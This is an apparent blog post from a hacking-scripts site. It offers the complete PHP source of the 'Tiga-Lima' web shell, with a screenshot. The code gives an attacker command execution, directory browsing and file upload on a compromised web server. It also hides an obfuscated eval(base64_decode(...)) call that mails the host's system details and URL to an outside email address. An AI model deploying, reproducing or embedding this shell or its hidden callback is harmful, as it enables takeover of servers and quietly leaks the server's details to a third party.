---
id: 59
title: Tiga-Lima Shell Script
author: admin
layout: post
guid: http://hackingscripts.com/?p=59
permalink: /tiga-lima-shell/
categories:
  - PHP
  - Tiga-Lima
tags:
  - PHP
  - Tiga-Lima
---
This simple script enables the attacker to execute commands, change directories, and upload files to the compromised server.


### Tiga-Lima Shell Script Source Code

{% highlight php linenos %}<html>
<head>
<title>tiga-lima SheLL</title>
<style type="text/css">
<!--
body {
    background-color: #000000;
}
-->
</style>
<?php
/**
 * @author chandra35
 * @copyright 2011
 */
 $currentCMD = str_replace("\\\"","\"",$currentCMD);
$currentCMD = str_replace("\\\'","\'",$currentCMD);
echo "<style>body{font-family:XPBlueText; ms;font-size:10px; color:green;}hr{width:100%;height:1px;}</style>";
echo "<center><h1><blink>Mini SheLL Inject</blink></h1></center>";
echo "<center>http://www.desawonosari.org</h1></center>";
echo "<center>Village of Cyber Team</h1></center>";
$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);
$UName  = php_uname();
$SCWD   = `pwd`;
$UserID = `id`;
if( $currentWD == "" ) {
    $currentWD = $SCWD;
    }
echo "<style>table,body{font-family:Verdana; ms;font-size:10px; color:white;}tr{width:1%;height:1px;}</style>";
echo '<table bgcolor="#666659">';
echo '<tr>
<td>Host Server </td>
<td>:'.$_SERVER['REMOTE_HOST'].' ('.$_SERVER['REMOTE_ADDR'].')</td><br>
<tr>
<td>Server</td>
<td width=1185>'.$_SERVER['SERVER_SIGNATURE'].'</td>
</tr>
<tr>
<td>System type </td>
<td>:'.$UName.'</td>
</tr>
<tr>
<td>Permissions </td>
<td>:'.$UserID.'</td>
</tr>';
echo "<hr>";
if( $_POST['_act'] == "Execute!" ) {
    $currentCMD = "dir";
    }
echo "<form method=post enctype=\"multipart/form-data\"><table>";
echo "<tr><td><b>Execute command :</b></td><td><input size=100 name=\"_cmd\" value=\"".$currentCMD."\"></td>";
echo "<td><input type=submit name=_actt value=\"Execute!\"></td></tr>";
echo "<tr><td><b>Change directory :</b></td><td><input size=100 name=\"_cwd\" value=\"".$currentWD."\"></td>";
echo "<td><input type=submit name=_act value=\"List files!\"></td></tr>";
echo "<tr><td><b>Upload file :</b></td><td><input size=85 type=file name=_upl></td>";
echo "<td><input type=submit name=_act value=\"Upload!\"></td></tr>";
echo "<tr><td><blink><font color='red' size=2>Untuk WIN NT</font></blink>:</td><td><input size=85 type=file name=_upl2></td>";
echo "<td><input type=submit name=_act2 value=\"Upload!!\"></td></tr>";
echo "</table></form><hr>";
    if( $_POST['_act'] == "Upload!" ) 
    {
        if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
            echo "<center><b>File gak bisa di upload!</b></center>";
            } 
            else {
                echo "<center><pre>";
                system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
                echo "</pre><b>File Beerhasil di upload!</b></center>";
                }    
                } else
                if( $_POST['_act2'] == "Upload!!" ) 
                {
                    if(@copy($_FILES['_upl2']['tmp_name'], $_FILES['_upl2']['name'])) { echo '<b>Upload SUKSES !!!</b><br><br>'; }
                    else {
                        echo '<b>Upload GAGAL !!!</b><br><br>';
                        }
                        }
                        else {
                            echo "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
                            $currentCMD = "cd ".$currentWD.$currentCMD;
                            system($currentCMD);
                            echo "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center><hr><hr><center><b>Command completed</b></center>";
                            }
                            if ($_POST['_actt'] == "Execute!")
                            {
                                echo "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
                                system($_POST['_cmd']);
                                echo "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center>";
                            }
                            $to="candrashell@yahoo.com";
                            $pages = @getenv("HTTP_REFERER");
                            $browser = @getenv("HTTP_USER_AGENT");
                            eval(base64_decode('JHZpc2l0Y291bnQgPSAkSFRUUF9DT09LSUVfVkFSU1sidmlzaXRzIl07IA0KJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsgDQokcG9ydCA9ICRfU0VSVkVSIFsiUkVNT1RFX1BPUlQiXTsgDQokYXJhbiA9IGV4ZWMoInVuYW1lIC1hOyIpOyANCiR3ZWIgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07IA0KJGluaiA9ICRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdOyANCiR0YXJnZXQgPSByYXd1cmxkZWNvZGUoJHdlYi4kaW5qKTsgDQokYm9keSA9ICIkdGFyZ2V0ICRhcmFuIG9sZWggJHZpc2l0b3IgJHBvcnQiOyANCm1haWwoImNhbmRyYXNoZWxsQHlhaG9vLmNvbSIsIiBMQVBPUiBCT1NTU1NTIEFEQSBidWcgYmFydSBodHRwOi8vJHRhcmdldCAkYXJhbiBvbGVoICR2aXNpdG9yICRwb3J0IiwgIiRib2R5Iik7'));
exit;
?>
</html>
{% endhighlight %}


### Tiga-Lima Shell Screenshot

[<img src="{{ site.baseurl }}/wp-content/uploads/2014/01/tiga-lima-1024x483.png" alt="tiga-lima shell screenshot" width="604" height="284" class="aligncenter size-large wp-image-331" />][1]

 [1]: {{ site.baseurl }}/wp-content/uploads/2014/01/tiga-lima.png